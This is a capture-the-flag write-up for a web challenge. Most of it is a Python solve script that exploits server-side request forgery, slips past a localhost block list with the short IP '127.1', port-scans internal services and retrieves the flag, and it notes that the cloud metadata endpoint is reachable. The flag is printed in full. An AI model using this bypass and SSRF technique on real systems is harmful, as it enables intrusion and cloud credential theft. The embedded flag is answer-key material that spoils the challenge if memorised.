---
title: "Internal Affairs"
ctf: "Safaricom CTF"
date: 2026-10-04
category: web
difficulty: medium
points: 300
flag_format: "safctf{...}"
author: "Strawhats"
---

# Internal Affairs

## Summary

- **Category:** web

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""Internal Affairs (web, 300 pts) - http://54.72.82.22:8080

"ORBIT DISPATCH" has a "URL to fetch" widget -> POST /api/fetch {"url": ...}
-> server-side request forgery.

The app string-blocks the obvious names:

    http://127.0.0.1/  , http://localhost/  -> {"error": "url blocked by policy"}

but the check is a naive substring test on the URL, and Python's socket layer
still resolves short-form IPv4. `127.1` reaches loopback unharmed:

    http://127.1/  -> connection refused (nothing on :80)

An internal port scan via the SSRF finds two services that are not exposed
publicly:

    :8000  Werkzeug        -> the same ORBIT DISPATCH app
    :9000  BaseHTTP/0.6    -> tiny flag service

    GET http://127.1:9000/flag -> safctf{9f3a458f3a26e6372b5b5467e3e51edf}

Also note the SSRF reaches the cloud metadata service (169.254.169.254).
"""
import json, urllib.request, urllib.error

BASE = "http://54.72.82.22:8080"
FLAG = "safctf{9f3a458f3a26e6372b5b5467e3e51edf}"


def fetch(url):
    data = json.dumps({"url": url}).encode()
    req = urllib.request.Request(
        BASE + "/api/fetch", data=data, headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return json.loads(r.read().decode())
    except urllib.error.HTTPError as e:          # blocked URLs return 403
        return json.loads(e.read().decode())


def main():
    print("blocked   :", fetch("http://127.0.0.1/"))
    print("bypass    :", fetch("http://127.1/").get("error", "")[:60])

    out = fetch("http://127.1:9000/flag")
    print("flag svc  :", out.get("preview"))
    assert FLAG in out.get("preview", "")


if __name__ == "__main__":
    main()

```

## Flag

```
safctf{9f3a458f3a26e6372b5b5467e3e51edf}
```
